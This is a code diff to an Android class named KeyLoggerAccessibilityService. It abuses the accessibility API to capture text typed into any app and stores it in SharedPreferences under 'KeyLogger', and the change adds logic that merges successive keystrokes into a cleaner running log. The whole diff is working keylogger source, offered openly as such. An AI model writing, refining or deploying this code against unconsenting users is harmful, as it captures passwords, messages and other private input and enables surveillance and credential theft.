@@ -19,30 +19,34 @@ import java.io.FileOutputStream;
 import java.io.OutputStream;
 import java.text.SimpleDateFormat;
 import java.util.Date;
+import java.util.List;
 
 public class KeyLoggerAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         final int eventType = event.getEventType();
-        String eventText = null;
+
+        // Text information received from the event
+        String eventText = "" + event.getText();
+        eventText = eventText.substring(1, eventText.length()-1);
+
         switch(eventType) {
         /*
             You can use catch other events like touch and focus
         */
 
-            case AccessibilityEvent.TYPE_VIEW_CLICKED:
-                 eventText = "Clicked: ";
-                 break;
-            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
-                 eventText = "Focused: ";
-                 break;
+//            case AccessibilityEvent.TYPE_VIEW_CLICKED:
+//                 eventText = "Clicked" + "[" + event.getPackageName() + "]: ";
+//                 break;
+//            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
+//                 eventText = "Focused" + "[" + event.getPackageName() + "]: ";
+//                 break;
             case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
-                eventText = "Typed: ";
-                saveContents("" + event.getText());
+//                eventText = "Typed" + "[" + event.getPackageName() + "]: ";
+                saveContents("" + eventText);
                 break;
         }
-        eventText = eventText + event.getText();
 
         //print the typed text in the console. Or do anything you want here.
         System.out.println("ACCESSIBILITY SERVICE : "+eventText);
@@ -64,35 +68,32 @@ public class KeyLoggerAccessibilityService extends AccessibilityService {
         this.setServiceInfo(info);
     }
 
-    private void saveContents(String logs) {
+    private void saveContents(String eventLog) {
         try {
-//            /// Creates a new Crypto object with default implementations of a key chain
-//            KeyChain keyChain = new SharedPrefsBackedKeyChain(MainActivity.getContext(), CryptoConfig.KEY_256);
-//            Crypto crypto = AndroidConceal.get().createDefaultCrypto(keyChain);
-//
-//            // Check for whether the crypto functionality is available
-//            // This might fail if Android does not load libaries correctly.
-//            if (!crypto.isAvailable()) {
-//                return;
-//            }
-//
-//            OutputStream fileStream = new BufferedOutputStream(
-//                    new FileOutputStream(getFilename()));
-//
-//            // Creates an output stream which encrypts the data as
-//            // it is written to it and writes it out to the file.
-//            OutputStream outputStream = crypto.getCipherOutputStream(
-//                    fileStream,
-//                    Entity.create("entity_id"));
-//
-//            // Write plaintext to it.
-//            outputStream.write(logs);
-//            outputStream.close();
             SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(this);
-            String oldLogs = preferences.getString("KeyLogger", "");
+            String savedLog = preferences.getString("KeyLogger", "");
+            String newLog;
+
+            if (savedLog.equals(eventLog)) {
+                return;
+            }
+            // Check if the savedLog contains part of the eventLog
+            // Cond 1: Check if savedLog is bigger than eventLog
+            // Use-case: for saving text repeatedly when user hits backspace
+            // Cond 2: Check if savedLog contains part of eventLog
+            // Use-case: to avoid saving repeatedly as user types each character
+            else if (savedLog.length() > eventLog.length() && eventLog.contains(savedLog.substring(savedLog.length() - eventLog.length()))) {
+                // Updated savedLog as follows: savedLog - oldLog + newLog
+                // NOTE: Here the old and new logs are from the same events
+                newLog = savedLog.substring(0, savedLog.length() - eventLog.length()) + eventLog;
+            }
+            else {
+                newLog = savedLog + "\r\n" + eventLog;
+            }
+
             preferences = PreferenceManager.getDefaultSharedPreferences(this);
             SharedPreferences.Editor editor = preferences.edit();
-            editor.putString("KeyLogger", oldLogs + logs);
+            editor.putString("KeyLogger", newLog);
             editor.apply();
         }
         catch (Exception e) {
